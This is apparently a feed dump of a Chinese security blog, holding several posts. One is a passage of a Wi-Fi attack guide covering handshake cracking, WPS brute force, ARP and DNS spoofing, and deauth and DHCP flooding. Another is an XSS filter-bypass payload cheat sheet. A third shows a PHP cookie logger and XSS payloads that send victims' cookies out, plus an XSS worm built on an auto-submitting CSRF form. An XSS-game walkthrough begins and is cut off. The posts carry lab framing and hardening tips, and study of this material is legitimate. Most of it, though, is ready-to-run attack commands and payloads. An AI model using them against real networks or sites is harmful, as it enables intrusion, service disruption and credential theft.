[wifibssid] -c [信道最好指定] wlan0mon<br><img src="https://Lmg66.github.io/img/153.png" alt="图片"><br>管理针攻击将其他用户踢下线<br>aireplay-ng -0 5 -a [路由bssid] -c [客户端STATION] wlan0mon<br><img src="https://Lmg66.github.io/img/154.png" alt="图片"><br>管理针攻击获得握手包<br><img src="https://Lmg66.github.io/img/155.png" alt="图片"><br>如果出现错误可尝试<br>–ignore-negative-one           忽略-1信道<br>根据握手包暴力破解密码<br>aircrack-ng -w [密码字典] [握手包.cap]<br><img src="https://Lmg66.github.io/img/156.png" alt="图片"><br><img src="https://Lmg66.github.io/img/157.png" alt="图片"><br><img src="https://Lmg66.github.io/img/158.png" alt="图片"><br>根据握手包破解密码加速<br>这里推荐使用windows下GPU加速工具EWSA，还有其他加速方式不过我不怎么推荐，也可以找专业的跑包团队来跑包<br>EWSA下载和使用说明地址:<a href="https://www.52pojie.cn/thread-989800-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-989800-1-1.html</a><br>找跑包地址：<a href="https://www.anywlan.com/forum-134-1.html" target="_blank" rel="noopener">https://www.anywlan.com/forum-134-1.html</a><h3 id="ping攻击-前提路由器开启wps"><a href="#ping攻击-前提路由器开启wps" class="headerlink" title="ping攻击 前提路由器开启wps"></a>ping攻击 前提路由器开启wps</h3>8位ping码，第8位数是校验码，只需要破解七位，ping码分前部分(4位)后部分(3位)，pin认证连接失败，路由器返回EAP-NACK信息，通过回应，能够确定pin的前部分或后部分是否正确，所以可能性是11000(10^4+10^3),不过考虑信号和路由器的处理性能网卡功率等可能时间会长，如果信号好，网卡，路由器也比较好一般需要6个小时左右<br>查看开启wps的wifi<pre><code>wash -i wlan0mon</code></pre><img src="https://Lmg66.github.io/img/159.png" alt="图片"><br>reaver -I wlan0mon -b [BSSID] -vv 还可以加其他参数 进行爆破<br><img src="https://Lmg66.github.io/img/160.png" alt="图片"><h3 id="kali自动化工具wifite"><a href="#kali自动化工具wifite" class="headerlink" title="kali自动化工具wifite"></a>kali自动化工具wifite</h3>原理：就是上面的命令只不过是自动化了<br>使用：cmd输入wifite进入扫描<br><img src="https://Lmg66.github.io/img/161.png" alt="图片"><br>觉得扫描好了ctrl+c就好，按照序号选择要破解的wifi即可，根据wifi开启了啥会进行自动的破解，如果想跳过某个破解方式按ctrl+c即可，如果获取到握手包自带的密码字典没跑出来，可以去上面提醒的路径找握手包，用自己的字典跑<br><img src="https://Lmg66.github.io/img/162.png" alt="图片"><br><img src="https://Lmg66.github.io/img/163.png" alt="图片"><h3 id="突破限制"><a href="#突破限制" class="headerlink" title="突破限制"></a>突破限制</h3><h4 id="mac地址限制"><a href="#mac地址限制" class="headerlink" title="mac地址限制"></a>mac地址限制</h4>扫描查看已连接的客户机的mac地址将网卡的mac地址改为其即可<br>先down掉网卡<br>ifconfig wlan0 down<br>修改mac地址<br>macchanger wlan0 -m [需要修改的mac地址，有些网卡可能不支持修改]<br>启动网卡<br>ifconfig wlan0 up<h4 id="未广播ssid的wifi"><a href="#未广播ssid的wifi" class="headerlink" title="未广播ssid的wifi"></a>未广播ssid的wifi</h4></li></ul><p>1.等待其他用户连接，会先询问ssid<br>airodump-ng wlan0mon 就能看见<br>2.将别人踢下线，让其重连，和抓起握手包一样，注意信道<br>aireplay-ng -0 5 -a [路由bssid] -c [客户端STATION]</p><h2 id="连接wifi后的利用-内网渗透"><a href="#连接wifi后的利用-内网渗透" class="headerlink" title="连接wifi后的利用(内网渗透)"></a>连接wifi后的利用(内网渗透)</h2><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p>查看内网的主机<br>nmap -sP 192.168.1.0/24 -v<br><img src="https://Lmg66.github.io/img/164.png" alt="图片"><br>开启转发模式</p><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><p>双向欺骗分别是目标主机ip和网关<br>arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.106<br>arpspoof -i eth0 -t 192.168.1.106 -r 192.168.1.1<br><img src="https://Lmg66.github.io/img/165.png" alt="图片"><br><img src="https://Lmg66.github.io/img/166.png" alt="图片"><br>启动wireshare查看ip.src == 192.168.1.106，发现欺骗成功可以拦截他的访问<br><img src="https://Lmg66.github.io/img/167.png" alt="图片"><br>driftnet -i eth0 监听图片<br><img src="https://Lmg66.github.io/img/168.png" alt="图片"></p><h3 id="毒化内网用户无法上网"><a href="#毒化内网用户无法上网" class="headerlink" title="毒化内网用户无法上网"></a>毒化内网用户无法上网</h3><p>原理:进行arp欺骗但不进行转发<br>echo 0 &gt; /proc/sys/net/ipv4/ip_forward<br>双向欺骗<br>arpspoof -i eth0 -t 192.168.1.1 -r 192.168.1.106<br>arpspoof -i eth0 -t 192.168.1.106 -r 192.168.1.1</p><h3 id="dns劫持"><a href="#dns劫持" class="headerlink" title="dns劫持"></a>dns劫持</h3><p>目标主机window7   ip地址 192.168.124.128<br>攻击机kali              ip地址 192.168.124.139<br>劫持到web服务window10(phpstudy) ip地址 192.168.1.104<br>修改配置文件nano /etc/ettercap/etter.dns<br><img src="https://Lmg66.github.io/img/169.png" alt="图片"><br>ettercap -Tq -i eth0 -P dns_spoof /// ///<br>进行欺骗-i后是无线网卡 ///中加目标主机和网卡，不加就是全部，发现window7被劫持成功，如果安装杀毒软件可能劫持不了<br><img src="https://Lmg66.github.io/img/170.png" alt="图片"><br><img src="https://Lmg66.github.io/img/171.png" alt="图片"><br>如何恢复</p><pre><code>ipconfig/flushdns刷新即可</code></pre><p><img src="https://Lmg66.github.io/img/172.png" alt="图片"></p><h3 id="mac地址表泛红"><a href="#mac地址表泛红" class="headerlink" title="mac地址表泛红"></a>mac地址表泛红</h3><p>交换机中有mac地址表记录连接的pc，攻击者不断刷新mac地址来填满交换机的mac地址表，交换机在mac地址表找不到该用户只能通过广播的形式发送，攻击者就可以截获数据<br>交换机设置静态mac地址绑定可预防，非表内请求将全部丢弃</p><pre><code>macof -i eth0</code></pre><h3 id="dhcp地址耗尽攻击"><a href="#dhcp地址耗尽攻击" class="headerlink" title="dhcp地址耗尽攻击"></a>dhcp地址耗尽攻击</h3><p>路由器分配ip，攻击者发送大量discover包来获取ip让其者无ip使用，无法连接<br>先安装<br>apt-get install yersinia<br>启动<br>yersinia -G<br><img src="https://Lmg66.github.io/img/173.png" alt="图片"><br><img src="https://Lmg66.github.io/img/174.png" alt="图片"></p><h2 id="干扰通讯"><a href="#干扰通讯" class="headerlink" title="干扰通讯"></a>干扰通讯</h2><p>以下利用前提无线网卡要开启监听模式</p><h3 id="创建恶意的无线热点"><a href="#创建恶意的无线热点" class="headerlink" title="创建恶意的无线热点"></a>创建恶意的无线热点</h3><p>工具mdk3 mdk3可查看使用说明</p><pre><code>mdk3 wlan0mon b -n SSID (-f 可以导入列表创建多个ssidwifi，不指定则随机) -c [信道] -w -g -s 100</code></pre><h3 id="验证洪水攻击-攻击路由器"><a href="#验证洪水攻击-攻击路由器" class="headerlink" title="验证洪水攻击(攻击路由器)"></a>验证洪水攻击(攻击路由器)</h3><p>伪造大量的client去连接ap,可导致正在已连接用户无反应 -a后加交换机ssid</p><pre><code>mdk3 wlan0mon a -a FC:D7:33:DE:F3:8A -c  -s 300</code></pre><h3 id="强制解除验证洪水攻击方式-针对客户机使其下线，通过模仿管理针"><a href="#强制解除验证洪水攻击方式-针对客户机使其下线，通过模仿管理针" class="headerlink" title="强制解除验证洪水攻击方式(针对客户机使其下线，通过模仿管理针)"></a>强制解除验证洪水攻击方式(针对客户机使其下线，通过模仿管理针)</h3><p>就是之前抓握手包一样将别人踢下线</p><pre><code>aireplay-ng -0 5 -a [路由bssid] -c [客户端STATION] wlan0mon</code></pre><p>用mdk3针对全网，在攻击中踢掉线后也无法连接成功</p><pre><code>mdk3 wlan0mon d</code></pre><p>可-b 加文件指定mac地址攻击</p><h2 id="如何设置路由器更安全"><a href="#如何设置路由器更安全" class="headerlink" title="如何设置路由器更安全"></a>如何设置路由器更安全</h2><p>攻与防御本身就是一场博弈根据上面的攻击方式我们可以设置路由器是wifi更安全尤其是物联网的发展，家里的很多东西都要连接网络</p><ol><li>wifi加密方式采用wpa加密，不用采用wpe加密，如果不懂wps，也不要开启wps功能</li><li>wifi密码要不要使用弱口令</li><li>对于常用设备可以进行ip和mac的绑定</li><li>如果没有用户之间相互访问的需求可以开启ap隔离</li><li>可以设置访客wifi，防止密码被泄露</li><li>就是选用一些比较好的路由器，防止路由器本身存在漏洞，路由器页面就是web页面可能存在漏洞</li><li>尽量少使用wifi万能钥匙，腾讯wifi管家等，或者使用时找到里面的设置不共享自己的wifi密码<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>b站：<a href="https://www.bilibili.com/video/BV1e7411o7GB?p=1" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1e7411o7GB?p=1</a><br>b站：<a href="https://www.bilibili.com/video/BV14z4y1Q7Nb?from=search&seid=10037556429710890008" target="_blank" rel="noopener">https://www.bilibili.com/video/BV14z4y1Q7Nb?from=search&amp;seid=10037556429710890008</a><br>论坛：<a href="https://www.anywlan.com/" target="_blank" rel="noopener">https://www.anywlan.com/</a><br>等等等很多前辈的文章，没法都列举(找不到了)，表示抱歉和感谢</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文主要讲述 &lt;strong&gt;家庭家庭家庭中&lt;/strong&gt;（重要的事情说三遍，企业认证服务器的wifi一般非常非常的安全破解不来）如何破
      
    
    </summary>
    
    
      <category term="无线安全" scheme="https://lnng.top/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="wifi渗透" scheme="https://lnng.top/tags/wifi%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>xss原理绕过防御个人总结</title>
    <link href="https://lnng.top/posts/a100.html"/>
    <id>https://lnng.top/posts/a100.html</id>
    <published>2020-07-25T08:53:37.000Z</published>
    <updated>2020-07-25T09:07:24.908Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xss原理"><a href="#xss原理" class="headerlink" title="xss原理"></a>xss原理</h2><p>xss产生的原因是将恶意的html脚本代码插入web页面，底层原理和sql注入一样，都是因为js和php等都是解释性语言，会将输入的当做命令执行,所以可以注入恶意代码执行我们想要的内容</p><h2 id="xss分类"><a href="#xss分类" class="headerlink" title="xss分类"></a>xss分类</h2><ul><li>存储型xss:<br>js脚本代码会插入数据库，具有一定的持久性</li><li>反射型xss:<br>js经过后端php等语言处理</li><li>dom型xss:<br>和反射型xss类似，但是不经过后端服务器的处理<h2 id="xss绕过总结"><a href="#xss绕过总结" class="headerlink" title="xss绕过总结:"></a>xss绕过总结:</h2><h3 id="自身绕过"><a href="#自身绕过" class="headerlink" title="自身绕过"></a>自身绕过</h3><pre><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;  //没有过滤&lt;Script&gt;alert(&#39;xss&#39;)&lt;/Script&gt; //大小写绕过&lt;scscriptript&gt;alert(&#39;xss&#39;)&lt;/scscriptript&gt; //嵌套绕过&lt;sc\x00ript&gt;alert(&#39;xss&#39;)&lt;/sc\x00ript&gt; //空字节绕过&quot; oonnclick=alert(&#39;XSS&#39;) //           //闭合单双引号绕过(对于html实体输入的和过滤&lt; &gt;)</code></pre></li></ul><h3 id="其他标签绕过"><a href="#其他标签绕过" class="headerlink" title="其他标签绕过"></a>其他标签绕过</h3><pre><code>&lt;a herf=&quot;javascript:alert(1)&quot;&gt;show&lt;/a&gt; &lt;body onload=alert(1)&gt;&lt;input type=image src=x:x onerror=alert(1)&gt;&lt;isindex onmouseover=&quot;alert(1)&quot; &gt;&lt;form oninput=alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;textarea autofocus onfocus=alert(1)&gt;&lt;input oncut=alert(1)&gt;&lt;svg onload=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;&lt;marquee onstart=alert(1)&gt;</code></pre><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h4><pre><code>&lt;a herf=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;show&lt;/a&gt;&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#39;))&quot;&gt;               </code></pre><h4 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h4><p>在线编码地址:<a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/unicode.aspx</a></p><pre><code>&lt;img src=&quot;x&quot; onerror=&quot;eval(&#39;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#39;)&quot;&gt;&lt;script&gt;\u0061lert(1)&lt;/script&gt;&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</code></pre><p><img src="https://Lmg66.github.io/img/146.png" alt="图片"></p><h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><pre><code>&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#39;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#39;))&quot;&gt;</code></pre><h4 id="Ascii码绕过"><a href="#Ascii码绕过" class="headerlink" title="Ascii码绕过"></a>Ascii码绕过</h4><pre><code>&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&lt;/script&gt;</code></pre><p>可使用浏览器插件快速编码<br><img src="https://Lmg66.github.io/img/147.png" alt="图片"></p><h4 id="hex绕过"><a href="#hex绕过" class="headerlink" title="hex绕过"></a>hex绕过</h4><pre><code>&lt;img src=x onerror=eval(&#39;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#39;)&gt;</code></pre><h4 id="十进制，八进制，十六进制"><a href="#十进制，八进制，十六进制" class="headerlink" title="十进制，八进制，十六进制"></a>十进制，八进制，十六进制</h4><pre><code>&lt;img src=x onerror=&quot;\u0061lert(1)&quot;/&gt;&lt;img src=x onerror=&quot;eval(&#39;\141lert(1)&#39;)&quot;/&gt;&lt;img src=x onerror=&quot;eval(&#39;\x61lert(1)&#39;)&quot;/&gt;&lt;img src=x onerror=”&amp;#x0061;lert(1)”/&gt;&lt;img src=x onerror=”&amp;#97;lert(1)”/&gt;&lt;img src=x onerror=”eval(‘\a\l\ert(1)‘)”/&gt;</code></pre><h3 id="补充-on事件"><a href="#补充-on事件" class="headerlink" title="补充:on事件"></a>补充:on事件</h3><pre><code>onsearchonwebkitanimationendonwebkitanimationiterationonwebkitanimationstartonwebkittransitionendonabortonbluroncanceloncanplayoncanplaythroughonchangeonclickoncloseoncontextmenuoncuechangeondblclickondragondragendondragenterondragleaveondragoverondragstartondropondurationchangeonemptiedonendedonerroronfocusonformdataoninputoninvalidonkeydownonkeypressonkeyuponloadonloadeddataonloadedmetadataonloadstartonmousedownonmouseenteronmouseleaveonmousemoveonmouseoutonmouseoveronmouseuponmousewheelonpauseonplayonplayingonprogressonratechangeonresetonresizeonscrollonseekedonseekingonselectonstalledonsubmitonsuspendontimeupdateontoggleonvolumechangeonwaitingonwheelonauxclickongotpointercaptureonlostpointercaptureonpointerdownonpointermoveonpointeruponpointercancelonpointeroveronpointeroutonpointerenteronpointerleaveonselectstartonselectionchangeonanimationendonanimationiterationonanimationstartontransitionendonafterprintonbeforeprintonbeforeunloadonhashchangeonlanguagechangeonmessageonmessageerroronofflineononlineonpagehideonpageshowonpopstateonrejectionhandledonstorageonunhandledrejectiononunload</code></pre><h3 id="长度限制的绕过"><a href="#长度限制的绕过" class="headerlink" title="长度限制的绕过:"></a>长度限制的绕过:</h3><h4 id="可以利用事件如"><a href="#可以利用事件如" class="headerlink" title="可以利用事件如:"></a>可以利用事件如:</h4><pre><code>&quot;onclick=alert(1)// 来减少字数</code></pre><h4 id="将代码藏入location-hash中，构造为"><a href="#将代码藏入location-hash中，构造为" class="headerlink" title="将代码藏入location.hash中，构造为"></a>将代码藏入location.hash中，构造为</h4><pre><code>&quot;onclick=&quot;eval(location.hash.sustr(1))</code></pre><h4 id="注释将两个文本框变为一个"><a href="#注释将两个文本框变为一个" class="headerlink" title="注释将两个文本框变为一个"></a>注释将两个文本框变为一个</h4><h4 id="奇怪的符号解析"><a href="#奇怪的符号解析" class="headerlink" title="奇怪的符号解析"></a>奇怪的符号解析</h4><pre><code>&lt;svg/onload=alert()&gt;&lt;script/src=//⑭.₨&gt;</code></pre><p>参考文章:<a href="https://nosec.org/home/detail/3206.html" target="_blank" rel="noopener">https://nosec.org/home/detail/3206.html</a></p><h2 id="xss防御"><a href="#xss防御" class="headerlink" title="xss防御"></a>xss防御</h2><ol><li>设置cookie中设置httponly属性，那么js脚本将无法读取到cookie信息<br>PHP5(PHP5.2以上版本已支持HttpOnly参数的设置，同样也支持全局的HttpOnly的设置，在php.ini中设置，设置其值为1或者TRUE，来开启全局的Cookie的HttpOnly属性)<br>session.cookie_httponly =<br>当然代码也能实现：<br>ini_set(“session.cookie_httponly”, 1);<br>session_set_cookie_params(0, NULL, NULL, NULL, TRUE);</li><li>限制输入长度，在业务内减少用户能输入长度，像年龄，用户名等地方限制15个字符，几乎就很难xss（个人理解）</li><li>过滤业务用不到的字符如&lt; &gt;，script等标签字符</li><li>输出检查，输出到url的进行URLEncode，输出进行html实体化输出</li><li>成熟框架相对安全些（注意是相对）<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>深入理解浏览器解析机制和XSS向量编码：<a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/292.html</a><br>XSS过滤绕过速查表：<a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/153055.html</a><br>《白帽子讲web安全》</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;xss原理&quot;&gt;&lt;a href=&quot;#xss原理&quot; class=&quot;headerlink&quot; title=&quot;xss原理&quot;&gt;&lt;/a&gt;xss原理&lt;/h2&gt;&lt;p&gt;xss产生的原因是将恶意的html脚本代码插入web页面，底层原理和sql注入一样，都是因为js和php等都是解释性
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="https://lnng.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>xss利用</title>
    <link href="https://lnng.top/posts/b0f.html"/>
    <id>https://lnng.top/posts/b0f.html</id>
    <published>2020-07-18T12:09:53.000Z</published>
    <updated>2020-07-18T12:13:49.050Z</updated>
    
    <content type="html"><![CDATA[<h2 id="xss盗取cookie"><a href="#xss盗取cookie" class="headerlink" title="xss盗取cookie"></a>xss盗取cookie</h2><h3 id="什么是cookie"><a href="#什么是cookie" class="headerlink" title="什么是cookie"></a>什么是cookie</h3><p>cookie是曲奇饼，啊开个玩笑，cookie是每个用户登录唯一id和账号密码一样可以登录到网站，是的你没有听错cookie可以直接登录，至于服务器怎么设置cookie<br>和cookie存储这里就不说了，需的要自行百度</p><h3 id="xss盗取cookie-dvwa演示"><a href="#xss盗取cookie-dvwa演示" class="headerlink" title="xss盗取cookie(dvwa演示)"></a>xss盗取cookie(dvwa演示)</h3><p>学习xss时觉得啊这，不就是一个弹窗吗，有啥用，经过学习后发现xss的危害还是挺大的，弹窗的目的只是说明这里可以执行动态脚本，那就可以干很多事情了</p><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>官网:<a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a><br>下载地址:<a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>下载方式:zip下载或git <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>下载完成放入http服务下即可<br>我使用的是phpstudy下载地址:<a href="https://m.xp.cn/" target="_blank" rel="noopener">https://m.xp.cn/</a></p><h4 id="设置接受盗取cookie方式"><a href="#设置接受盗取cookie方式" class="headerlink" title="设置接受盗取cookie方式"></a>设置接受盗取cookie方式</h4><p>xss盗取的cookie肯定是要保存到我们自己的服务器上，可以设置一个接受cookie的php网页代码接受到请求携带cookie后保存到文件或者数据库中等都可以，当然也可以不设置存储，随便请求一个一个服务器网页存在不存在无所谓，因为请求可以保存到日志文件，但是看起来可能不方便而已，下面是保存cookie的php代码</p><pre><code>&lt;?phpif(isset($_GET[&#39;cookie&#39;]))                 //如果接收到cookie{    $file = fopen(&#39;./cookie.txt&#39;, &#39;a&#39;);    //打开存储的文件    fwrite($file, $_GET[&#39;cookie&#39;].&quot;\r\n&quot;); //将获取的cookie存储    fclose($file);                         //关闭文件}</code></pre><h4 id="放置xss-这里用存储型xss测试"><a href="#放置xss-这里用存储型xss测试" class="headerlink" title="放置xss(这里用存储型xss测试)"></a>放置xss(这里用存储型xss测试)</h4><pre><code>&lt;script&gt;document.location=&#39;http://127.0.0.1/cookies/cookies.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></pre><p>我这里用的本地的测试，document.cookie，就是获取cookie，然后携带cookie访问<a href="http://127.0.0.1/cookies/cookies.php?（换成自己服务器ip就可以了，这里我本地测试），先查看一下我们的cookie" target="_blank" rel="noopener">http://127.0.0.1/cookies/cookies.php?（换成自己服务器ip就可以了，这里我本地测试），先查看一下我们的cookie</a><br><img src="https://Lmg66.github.io/img/139.png" alt="图片"></p><p>然后点击我们放存储型xss的地方（xss(stored)）,发现跳转到了令一个网站，并且携带了你的cookie</p><p><img src="https://Lmg66.github.io/img/140.png" alt="图片"></p><p>在到cookie.php目录查看cookie.txt，可以发现cookie已经被存储，cookie被盗取，我们可以利用cookie进行登录<br><img src="https://Lmg66.github.io/img/141.png" alt="图片"><br>这种动静可能有点大，可以用js加载图片的方式来发送带有cookie的请求，</p><pre><code>&lt;script&gt;new Image().src = &#39;http://127.0.0.1/cookies/cookies.php?cookie=&#39;+document.cookie;&lt;/script&gt;</code></pre><p><a href="https://www.cnblogs.com/yangzhou33/p/9215937.html" target="_blank" rel="noopener">使用new Image()进行预加载</a><br><img src="https://Lmg66.github.io/img/142.png" alt="图片"><br>当然如果你还有其动静小的方法可以留言，当然还可以用来加载其他的xss神器js代码</p><pre><code>&lt;script src=&#39;&#39;&gt;</code></pre><h2 id="xss蠕虫"><a href="#xss蠕虫" class="headerlink" title="xss蠕虫"></a>xss蠕虫</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>有存储型xss，可以csrf</p><h3 id="原理（个人理解，如有错误可以评论联系我）"><a href="#原理（个人理解，如有错误可以评论联系我）" class="headerlink" title="原理（个人理解，如有错误可以评论联系我）"></a>原理（个人理解，如有错误可以评论联系我）</h3><p><img src="https://Lmg66.github.io/img/143.png" alt="图片"></p><h3 id="相关代码（只是简单的，有过滤，要考虑绕过）"><a href="#相关代码（只是简单的，有过滤，要考虑绕过）" class="headerlink" title="相关代码（只是简单的，有过滤，要考虑绕过）"></a>相关代码（只是简单的，有过滤，要考虑绕过）</h3><p>主体存储xss</p><pre><code>&lt;script&gt;document.location=&#39;csrf地址&#39;;&lt;/script&gt;</code></pre><p>csrf生成<br>用burpsuite抓包，右键，如图选择，copy复制，然后放到自己服务器等等，当然也可以自己编写csrf的poc，使之功能更加强大，可以自己点击等等，还有一些绕过等等，这只是简单的csrf的poc<br><img src="https://Lmg66.github.io/img/144.png" alt="图片"><br><img src="https://Lmg66.github.io/img/145.png" alt="图片"><br>csrf演示代码，抓取的dvwa包加了js自动点击</p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;form action=&quot;http://127.0.0.1/lmg/vulnerabilities/xss_s/index.php&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;txtName&quot; value=&quot;æµ&amp;#139;è&amp;#175;&amp;#149;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;mtxMessage&quot; value=&quot;æµ&amp;#139;è&amp;#175;&amp;#149;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;btnSign&quot; value=&quot;Sign&amp;#32;Guestbook&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;script type=&quot;text/javascript&quot;&gt;                          // js自动点击      var form = document.getElementsByTagName(&#39;form&#39;)[0];      var input = document.getElementsByTagName(&#39;input&#39;)[3];      input.value = window.location.hash.substr(1);      form.submit();  &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>受害者储存xss和主体xss类似只是跳转的网页不同</p><pre><code>&lt;script&gt;document.location=&#39;csrf地址&#39;;&lt;/script&gt;</code></pre><h3 id="个人思考"><a href="#个人思考" class="headerlink" title="个人思考"></a>个人思考</h3><p>xss的蠕虫利用起来还是比较难的，要有存储型xss（还要各种绕过），和csrf，但是危害是很大的，不仅仅是传播文章，可以利用这个传播盗取更多人cookie，个人信息，位置，浏览器版本安装软件等等</p><h2 id="xss利用的思考（持续思考）"><a href="#xss利用的思考（持续思考）" class="headerlink" title="xss利用的思考（持续思考）"></a>xss利用的思考（持续思考）</h2><p>像反射型xss，dom型的xss不在局限于点一个很长的链接，可以利用其他第三方网站来跳转，也可以利用短链接，也可以利用二维码，二维码捆绑一个链接，所以扫描未知二维码是非常危险的事情<br>像存储型xss，可以利用储存型xss对其他网站进行流量攻击</p><h2 id="参考文章与说明"><a href="#参考文章与说明" class="headerlink" title="参考文章与说明"></a>参考文章与说明</h2><p><a href="https://www.freebuf.com/vuls/191274.html" target="_blank" rel="noopener">技术讨论 | 记一次XSS蠕虫渗透实验</a><br>说明：本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;xss盗取cookie&quot;&gt;&lt;a href=&quot;#xss盗取cookie&quot; class=&quot;headerlink&quot; title=&quot;xss盗取cookie&quot;&gt;&lt;/a&gt;xss盗取cookie&lt;/h2&gt;&lt;h3 id=&quot;什么是cookie&quot;&gt;&lt;a href=&quot;#什么是cooki
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="https://lnng.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>xss小游戏源码分析</title>
    <link href="https://lnng.top/posts/996d.html"/>
    <id>https://lnng.top/posts/996d.html</id>
    <published>2020-07-16T08:02:41.000Z</published>
    <updated>2020-07-18T12:13:39.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>下载地址:<a href="https://files.cnblogs.com/files/Lmg66/xssgame-master.zip" target="_blank" rel="noopener">https://files.cnblogs.com/files/Lmg66/xssgame-master.zip</a><br>使用:下载解压，放到www目录下(phpstudy)，http服务下都行，我使用的是phpstudy</p><h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><h3 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;哎哟 不错哦！&quot;);window.location.href=&quot;level2.php?keyword=跨站师&quot;; }&lt;/script&gt;&lt;title&gt;第1关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第1关 先热个身吧&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户:&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/8deed969-b339-4c84-8654-b1a1e40e06de.png&quot; width=&quot;50%&quot;&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h3><p>对name没有任何的过滤输出到标签中,基本的xss都行</p><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><pre><code>level1.php?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><h3 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE 